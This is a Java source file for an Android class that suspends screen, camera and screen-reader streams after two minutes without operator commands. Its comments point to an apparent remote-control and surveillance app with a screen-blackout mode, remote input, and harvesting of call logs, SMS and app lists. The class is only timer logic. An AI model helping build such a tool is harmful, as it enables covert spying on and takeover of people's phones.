package com.task.tusker.utils;

import android.util.Log;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

/**
 * Suspends bandwidth-consuming streams after {@link #IDLE_TIMEOUT_MS} of no qualifying
 * UI-interaction command from the dashboard.
 *
 * <h3>Stream types (bitmask)</h3>
 * <ul>
 *   <li>{@link #STREAM_IDLE_FRAME}    — screen monitor (stream_start / stream_stop)</li>
 *   <li>{@link #STREAM_BLOCK_FRAME}   — screen blackout frame push</li>
 *   <li>{@link #STREAM_SCREEN_READER} — live screen-reader stream to dashboard</li>
 *   <li>{@link #STREAM_CAMERA}        — camera live stream</li>
 * </ul>
 *
 * <h3>Rules</h3>
 * <ul>
 *   <li>Timer resets whenever a qualifying interaction arrives OR a stream is started.</li>
 *   <li>On timeout: all active streams are suspended; device stays connected.</li>
 *   <li>On next qualifying interaction: screen streams auto-resume.
 *       Camera does NOT resume automatically — the operator must restart it.</li>
 *   <li>Data-query commands (call logs, SMS, installed apps, etc.) do NOT reset the timer.</li>
 *   <li>Qualifying interactions: touch, swipe, press_back/home/recents, open_notifications,
 *       open_quick_settings, scroll_up/down, input_text, press_enter, click_by_text,
 *       wake_screen, screen_off, open_task_manager.</li>
 * </ul>
 */
public class IdleSuspensionManager {

    private static final String TAG = "IdleSuspension";

    /** 2-minute idle window before streams are suspended. */
    public  static final long IDLE_TIMEOUT_MS      = 2 * 60 * 1000L;

    // ── Stream-type bitmask constants ──────────────────────────────────────
    public  static final int STREAM_IDLE_FRAME    = 0b0001;
    public  static final int STREAM_BLOCK_FRAME   = 0b0010;
    public  static final int STREAM_SCREEN_READER = 0b0100;
    public  static final int STREAM_CAMERA        = 0b1000;

    /** Screen-type streams that auto-resume on interaction (camera excluded). */
    private static final int SCREEN_STREAMS =
            STREAM_IDLE_FRAME | STREAM_BLOCK_FRAME | STREAM_SCREEN_READER;

    // ── Callback ──────────────────────────────────────────────────────────

    public interface Callback {
        /**
         * Called on the internal scheduler thread when the idle timeout fires.
         * The implementation must stop the streams indicated by {@code suspendedTypes}.
         * @param suspendedTypes bitmask of stream types that were active.
         */
        void onSuspend(int suspendedTypes);

        /**
         * Called on the internal scheduler thread when a qualifying interaction
         * arrives after a suspension.
         * @param resumeTypes bitmask of screen stream types to restart (camera excluded).
         */
        void onResume(int resumeTypes);
    }

    // ── Internal state (all accesses are synchronized on this) ────────────

    private final Callback callback;

    private final ScheduledExecutorService scheduler =
            Executors.newSingleThreadScheduledExecutor(r -> {
                Thread t = new Thread(r, "idle-suspension-timer");
                t.setDaemon(true);
                return t;
            });

    /** Bitmask of streams that are currently active. */
    private int activeStreams   = 0;
    /** True while we are in the suspended state. */
    private boolean suspended   = false;
    /** Bitmask of streams that were active when we last suspended. */
    private int suspendedTypes  = 0;

    private ScheduledFuture<?> timeoutFuture;
    /** When true the timer is cancelled and will not restart until un-inhibited. */
    private boolean inhibited = false;

    // ── Constructor ───────────────────────────────────────────────────────

    public IdleSuspensionManager(Callback callback) {
        this.callback = callback;
    }

    // ── Public API ────────────────────────────────────────────────────────

    /**
     * Call when a qualifying UI-interaction command is dispatched.
     * Resets the idle timer. If the device was suspended, schedules a resume
     * for screen streams (camera excluded) on the internal thread.
     */
    public synchronized void onInteraction() {
        if (suspended) {
            suspended = false;
            int toResume = suspendedTypes & SCREEN_STREAMS; // never auto-resume camera
            suspendedTypes = 0;
            if (toResume != 0) {
                Log.i(TAG, "UI interaction — resuming screen streams (mask=0b"
                        + Integer.toBinaryString(toResume) + ")");
                final int r = toResume;
                // Dispatch async so this method returns quickly and the caller is not blocked.
                scheduler.execute(() -> callback.onResume(r));
            }
            // Timer restarts naturally via onStreamStarted once streams come back up.
            return;
        }
        resetTimerLocked();
    }

    /**
     * Notify that a stream of the given type has started.
     * Clears the suspended bit for this type (handles operator manually restarting after suspend).
     * Resets the idle timer.
     */
    public synchronized void onStreamStarted(int streamType) {
        activeStreams |= streamType;
        if (suspended) {
            suspendedTypes &= ~streamType; // operator explicitly restarted this stream
            if (suspendedTypes == 0) suspended = false;
        }
        resetTimerLocked();
    }

    /**
     * Notify that a stream of the given type has stopped (user-initiated or by the
     * suspend callback itself). If no streams remain active, cancels the idle timer.
     */
    public synchronized void onStreamStopped(int streamType) {
        activeStreams &= ~streamType;
        if (activeStreams == 0) {
            cancelTimerLocked();
        }
        // If the device is currently suspended, also clear this type from the resume mask.
        // The operator explicitly stopped this stream — it must NOT auto-resume on interaction.
        if (suspended) {
            suspendedTypes &= ~streamType;
            if (suspendedTypes == 0) suspended = false;
        }
    }

    /**
     * Inhibit or un-inhibit the idle timer.
     * <p>
     * While inhibited the timer is cancelled and will not restart, so no streams will ever be
     * auto-suspended. This is used when screen-blackout mode is active — the operator is
     * actively controlling the device by definition, so suspension must not fire even if no
     * qualifying interaction commands arrive for 2 minutes.
     * </p>
     *
     * @param inhibit {@code true} to cancel and hold the timer; {@code false} to re-arm it
     *                (timer restarts immediately if any streams are still active).
     */
    public synchronized void setInhibited(boolean inhibit) {
        if (this.inhibited == inhibit) return; // no change — avoid spurious timer churn
        this.inhibited = inhibit;
        if (inhibit) {
            cancelTimerLocked();
        } else {
            resetTimerLocked(); // re-arm with fresh 2-min window if streams are still active
        }
    }

    /** Release resources. Call from the owning component's shutdown / disconnect. */
    public synchronized void shutdown() {
        cancelTimerLocked();
        scheduler.shutdownNow();
        activeStreams   = 0;
        suspended      = false;
        suspendedTypes = 0;
    }

    // ── Internals ─────────────────────────────────────────────────────────

    /** Must be called with {@code this} lock held. */
    private void resetTimerLocked() {
        cancelTimerLocked();
        if (inhibited) return;          // timer suppressed while block-frame mode is on
        if (activeStreams == 0) return; // nothing streaming — no timer needed
        timeoutFuture = scheduler.schedule(this::onIdleTimeout,
                IDLE_TIMEOUT_MS, TimeUnit.MILLISECONDS);
    }

    /** Must be called with {@code this} lock held. */
    private void cancelTimerLocked() {
        if (timeoutFuture != null && !timeoutFuture.isDone()) {
            timeoutFuture.cancel(false);
        }
        timeoutFuture = null;
    }

    /** Fired by the scheduler after {@link #IDLE_TIMEOUT_MS} of no interaction. */
    private void onIdleTimeout() {
        int types;
        synchronized (this) {
            if (activeStreams == 0 || suspended || inhibited) return; // already clean
            types          = activeStreams;
            suspended      = true;
            suspendedTypes = types;
            activeStreams   = 0;   // mark all inactive before calling back
            timeoutFuture  = null;
        }
        Log.i(TAG, "Idle for " + (IDLE_TIMEOUT_MS / 1000) + "s — suspending streams (mask=0b"
                + Integer.toBinaryString(types) + ")");
        callback.onSuspend(types);
    }
}
